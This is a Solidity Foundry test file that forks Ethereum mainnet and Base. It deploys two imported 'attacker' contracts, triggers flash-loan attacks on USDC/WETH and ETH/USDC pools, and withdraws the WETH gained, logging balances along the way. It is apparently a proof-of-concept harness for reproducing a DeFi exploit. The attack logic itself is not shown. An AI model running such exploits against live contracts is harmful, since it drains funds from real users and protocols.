// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {USDC_WETH30bpsMainnetAttacker} from "./USDC_WETH30bpsMainnetAttacker.sol";
import {ETH_USDC5bpsBaseAttacker} from "./ETH_USDC5bpsBaseAttacker.sol";
import {IERC20Partial} from "./Interfaces.sol";

contract MakingFakeTokenIdListPassTest is Test {

    function setUp() public {}

    address withdrawer = address(0x777);

    function testTakeFlashLoanAndAttack_USDC_WETH30bpsMainnetAttacker() public {
        vm.createSelectFork("mainnet");

        bytes32 salt = bytes32(uint256(0x123));
        USDC_WETH30bpsMainnetAttacker attacker = new USDC_WETH30bpsMainnetAttacker{salt: salt}(withdrawer);
        console.log("Attacker deployed at:", address(attacker));
        attacker.takeFlashLoanAndAttack();
        IERC20Partial WETH = IERC20Partial(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        console.log("balance before withdraw", WETH.balanceOf(withdrawer));
        vm.prank(withdrawer);
        attacker.withdraw(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 100000000001);
        console.log("balance after withdraw", WETH.balanceOf(withdrawer));
    }

    function testTakeFlashLoanAndAttack_ETH_USDC5bpsBaseAttacker() public {
        vm.createSelectFork("base");

        bytes32 salt = bytes32(uint256(0x123));
        ETH_USDC5bpsBaseAttacker attacker = new ETH_USDC5bpsBaseAttacker{salt: salt}();
        attacker.takeFlashLoanAndAttack();
    }
}
